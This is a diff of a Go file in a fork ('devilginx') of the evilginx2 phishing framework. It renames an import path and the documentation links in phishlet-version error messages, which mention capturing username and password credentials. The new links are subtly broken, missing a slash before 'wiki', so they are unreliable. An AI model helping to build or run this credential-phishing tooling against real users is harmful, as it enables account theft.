@@ -6,7 +6,7 @@ import (
 	"strconv"
 	"strings"
 
-	"github.com/kgretzky/evilginx2/log"
+	"github.com/afsin-asf/devilginx/log"
 	"github.com/spf13/viper"
 )
 
@@ -300,13 +300,13 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			"- move `username` and `password` into new `credentials` section\n" +
 			"- add `type` field to `username` and `password` with value 'post' or 'json'\n" +
 			"- change `min_ver` to at least `2.2.0`\n" +
-			"you can find the phishlet 2.2.0 file format documentation here: https://github.com/kgretzky/evilginx2/wiki/Phishlet-File-Format-(2.2.0)")
+			"you can find the phishlet 2.2.0 file format documentation here: https://github.com/afsin-asf/devilginxwiki/Phishlet-File-Format-(2.2.0)")
 	}
 	if !p.isVersionHigherEqual(&p.Version, "2.3.0") {
 		return fmt.Errorf("this phishlet is incompatible with current version of evilginx.\nplease do the following modifications to update it:\n\n" +
 			"- replace `landing_path` with `login` section\n" +
 			"- change `min_ver` to at least `2.3.0`\n" +
-			"you can find the phishlet 2.3.0 file format documentation here: https://github.com/kgretzky/evilginx2/wiki/Phishlet-File-Format-(2.3.0)")
+			"you can find the phishlet 2.3.0 file format documentation here: https://github.com/afsin-asf/devilginxwiki/Phishlet-File-Format-(2.3.0)")
 	}
 
 	fp := ConfigPhishlet{}
